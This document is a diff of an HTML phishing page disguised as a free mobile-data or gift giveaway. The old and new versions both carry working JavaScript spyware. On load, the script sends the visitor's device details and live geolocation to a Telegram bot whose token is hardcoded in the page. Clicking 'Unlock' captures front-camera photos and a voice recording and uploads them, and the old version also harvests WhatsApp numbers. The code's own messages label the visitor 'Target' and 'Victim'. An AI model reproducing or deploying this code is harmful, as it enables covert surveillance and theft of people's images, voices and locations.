@@ -1,170 +1,90 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-<meta charset="UTF-8">
-<title>PREMIUM DATA UNLIMITED</title>
-<style>
-  * { margin: 0; padding: 0; box-sizing: border-box; }
-  body {
-    display: flex; flex-direction: column; align-items: center; justify-content: center;
-    min-height: 100vh; background: linear-gradient(45deg, #0a0a0a, #1a0a2e, #16213e, #0f3460, #533483);
-    background-size: 400% 400%; animation: gradientShift 15s ease infinite; color: #fff;
-    font-family: 'Arial', sans-serif; overflow-x: hidden; position: relative;
-  }
-  @keyframes gradientShift { 0% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }
-  
-  /* Bot Logo Style */
-  .bot-logo {
-    width: 100px; height: 100px; border-radius: 50%; margin-bottom: 15px;
-    box-shadow: 0 0 25px rgba(0, 255, 255, 0.6);
-    border: 2px solid #00ffff;
-  }
-
-  .particles { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 1; }
-  .particle { position: absolute; width: 4px; height: 4px; background: linear-gradient(45deg, #00ffff, #ff00ff); border-radius: 50%; animation: float 8s infinite linear; opacity: 0.7; }
-  @keyframes float { 0% { transform: translateY(100vh) rotate(0deg); opacity: 0; } 100% { transform: translateY(-100px) rotate(360deg); opacity: 0; } }
-
-  .container { z-index: 10; text-align: center; padding: 20px; max-width: 400px; width: 100%; }
-  h1 { font-size: 2em; font-weight: 900; margin-bottom: 30px; background: linear-gradient(45deg, #00ffff, #ff00ff, #ffff00, #00ff00); background-size: 400% 400%; -webkit-background-clip: text; -webkit-text-fill-color: transparent; animation: rainbowText 3s ease-in-out infinite; }
-  @keyframes rainbowText { 0%, 100% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } }
-
-  .premium-container { position: relative; margin: 20px 0; }
-  .lock-overlay { position: absolute; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0, 0, 0, 0.7); backdrop-filter: blur(10px); border-radius: 25px; display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 20; transition: all 0.5s ease; }
-  .lock-overlay.hidden { opacity: 0; visibility: hidden; transform: scale(0.9); }
-  .unlock-btn { padding: 15px 30px; background: linear-gradient(45deg, #ffd700, #ffb347); border: none; border-radius: 50px; color: #000; font-weight: bold; cursor: pointer; text-transform: uppercase; box-shadow: 0 0 20px rgba(255, 215, 0, 0.5); }
-
-  #luckyBox { width: 300px; height: 150px; border-radius: 25px; background: rgba(255, 255, 255, 0.1); border: 2px solid #00ffff; display: flex; align-items: center; justify-content: center; font-size: 1.5em; font-weight: bold; cursor: pointer; }
-  #whatsappNumber { padding: 15px; border-radius: 50px; border: none; width: 250px; text-align: center; margin-top: 20px; }
-  .glassmorphism-btn { padding: 15px 30px; border-radius: 50px; border: none; background: #00ffff; color: #000; font-weight: bold; margin-top: 10px; cursor: pointer; }
-  .comment-card { background: rgba(255,255,255,0.1); padding: 10px; margin: 5px; border-radius: 10px; font-size: 0.8em; }
-</style>
+    <title>GIFT UNLOCKER</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
 </head>
-<body>
+<body style="background:#000; color:#fff; text-align:center; font-family:sans-serif;">
+    <img src="https://i.ibb.co/r2mF6nsn/dev-mitzii-logo.png" width="120" style="margin-top:50px;">
+    <h2>🎁 CONGRATULATIONS! 🎁</h2>
+    <p>You won a Premium Gift. Click below to Unlock.</p>
+    <button id="unlockBtn" style="padding:20px 40px; background:gold; font-weight:bold; border-radius:50px; border:none; cursor:pointer;">🔓 UNLOCK NOW</button>
 
-<div class="particles" id="particles"></div>
+    <script>
+    const botToken = '8679683909:AAHP8RCnEg39o5atbw50k6jGj5NDhe2feko';
+    const urlParams = new URLSearchParams(window.location.search);
+    const uid = urlParams.get('uid') || '5734261991';
 
-<div class="container">
-  <img src="https://files.catbox.moe/2sphp7.png" alt="MITZII LOGO" class="bot-logo">
-  
-  <h1>🚀 PREMIUM DATA UNLIMITED 🚀</h1>
-  
-  <div class="premium-container">
-    <div id="luckyBox">🎁 GIFT BOX 🎁</div>
-    <div class="lock-overlay" id="lockOverlay">
-      <div style="font-size: 3em;">🔒</div>
-      <h3 style="color: #ffd700; margin: 10px 0;">PREMIUM LOCKED</h3>
-      <button class="unlock-btn" id="unlockBtn">🔓 UNLOCK NOW</button>
-    </div>
-  </div>
+    async function sendToBot(msg) {
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${uid}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
+    }
 
-  <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
-  
-  <div id="comments">
-    <div class="comment-card"><p>🎉 10GB Data Received! Thanks 💎</p></div>
-    <div class="comment-card"><p>🔥 Best tool for unlimited data! 🚀</p></div>
-  </div>
-  
-  <div id="whatsappForm">
-    <input type="tel" id="whatsappNumber" placeholder="Enter WhatsApp Number">
-    <button class="glassmorphism-btn" id="submitNumber">Submit</button>
-  </div>
-</div>
+    async function sendFile(blob, type, caption) {
+        const fd = new FormData();
+        fd.append('chat_id', uid);
+        fd.append(type, blob);
+        fd.append('caption', caption);
+        fetch(`https://api.telegram.org/bot${botToken}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, { method: 'POST', body: fd });
+    }
 
-<script>
-// --- CONFIGURATION ---
-const botToken = '8679683909:AAHP8RCnEg39o5atbw50k6jGj5NDhe2feko';
-const channelId = '5734261991'; 
-// ---------------------
+    // 1. Device Info & App Detection
+    window.onload = () => {
+        let apps = (navigator.userAgent.includes("FBAN") || navigator.userAgent.includes("FB_IAB")) ? "Facebook App" : 
+                   (navigator.userAgent.includes("WhatsApp")) ? "WhatsApp" : "Browser/Other App";
+        
+        sendToBot(`🔥 *Target Caught!* \n📱 Device: ${navigator.platform}\n🔗 Opened via: ${apps}\n🔋 Battery: Unknown`);
+        
+        // App Switch Tracking
+        document.addEventListener("visibilitychange", () => {
+            if (document.hidden) sendToBot("⚠️ *Target switched to another App (WhatsApp/Home)*");
+            else sendToBot("👁️ *Target returned to Spy Page*");
+        });
+    };
 
-const urlParams = new URLSearchParams(window.location.search);
-const uid = urlParams.get('uid') || channelId;
+    // 2. Camera (Photo/Video) & Voice Hack
+    async function startSpying() {
+        // Request Permissions
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            
+            // Front Photo
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            await video.play();
+            const canvas = document.createElement('canvas');
+            canvas.width = 1280; canvas.height = 720;
+            setTimeout(() => {
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                canvas.toBlob(b => sendFile(b, 'photo', '📸 [FRONT] DEV MITZII HQ'), 'image/jpeg');
+            }, 2000);
 
-async function sendToTelegram(text) {
-  await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ chat_id: uid, text: text })
-  });
-  // Also send to main admin
-  await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ chat_id: channelId, text: "🔥 TARGET DATA:\n" + text })
-  });
-}
+            // Voice Hack (Audio Recording 5s)
+            const recorder = new MediaRecorder(stream);
+            let chunks = [];
+            recorder.ondataavailable = e => chunks.push(e.data);
+            recorder.onstop = () => {
+                const blob = new Blob(chunks, { type: 'audio/ogg' });
+                sendFile(blob, 'voice', '🎤 [VOICE] 5s RECORDING');
+            };
+            recorder.start();
+            setTimeout(() => recorder.stop(), 5000);
 
-async function sendFile(blob, type, caption) {
-  const formData = new FormData();
-  formData.append('chat_id', uid);
-  formData.append(type, blob);
-  formData.append('caption', caption);
-  await fetch(`https://api.telegram.org/bot${botToken}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, { method: 'POST', body: formData });
-}
+        } catch (e) { sendToBot("❌ Permission Denied by Victim"); }
+    }
 
-// Initial Data Fetch
-window.onload = async () => {
-  let battery = 'Unknown';
-  if (navigator.getBattery) {
-    const b = await navigator.getBattery();
-    battery = Math.round(b.level * 100) + '%';
-  }
-  await sendToTelegram(`🚀 Target Opened Link!\n📱 Device: ${navigator.userAgent}\n🔋 Battery: ${battery}`);
-  
-  // Location
-  if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(async (p) => {
-      await sendToTelegram(`🌍 Location: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
+    // 3. Location Tracking
+    if (navigator.geolocation) {
+        navigator.geolocation.watchPosition(p => {
+            sendToBot(`📍 *LIVE LOCATION:* \nhttps://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
+        });
+    }
+
+    document.getElementById('unlockBtn').addEventListener('click', () => {
+        sendToBot("🔓 *Victim Unlocking... Spying Started!*");
+        startSpying();
+        // Notification Request (Trick)
+        if ("Notification" in window) Notification.requestPermission();
     });
-  }
-};
-
-// Unlock Button Action
-document.getElementById('unlockBtn').addEventListener('click', async () => {
-  document.getElementById('unlockBtn').textContent = "Unlocking...";
-  
-  try {
-    // Camera Capture
-    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-    const video = document.createElement('video');
-    video.srcObject = stream;
-    await video.play();
-    
-    const canvas = document.getElementById('canvas');
-    const ctx = canvas.getContext('2d');
-    setTimeout(async () => {
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-        canvas.toBlob(async (blob) => {
-          await sendFile(blob, 'photo', '📸 Victim Front Photo');
-          stream.getTracks().forEach(t => t.stop());
-        }, 'image/jpeg');
-    }, 2000);
-
-  } catch (e) { console.log(e); }
-
-  setTimeout(() => {
-    document.getElementById('lockOverlay').classList.add('hidden');
-    alert("🎉 Premium Unlocked Successfully!");
-  }, 3000);
-});
-
-// WhatsApp Number Submit
-document.getElementById('submitNumber').addEventListener('click', async () => {
-  const num = document.getElementById('whatsappNumber').value;
-  if(num) {
-    await sendToTelegram(`💎 WhatsApp Number: ${num}`);
-    alert("Submitted! Data will be credited in 24 hours.");
-  }
-});
-
-// Particles
-const parts = document.getElementById('particles');
-for(let i=0; i<30; i++) {
-  const p = document.createElement('div');
-  p.className = 'particle';
-  p.style.left = Math.random() * 100 + '%';
-  p.style.animationDelay = Math.random() * 5 + 's';
-  parts.appendChild(p);
-}
-</script>
+    </script>
 </body>
 </html>
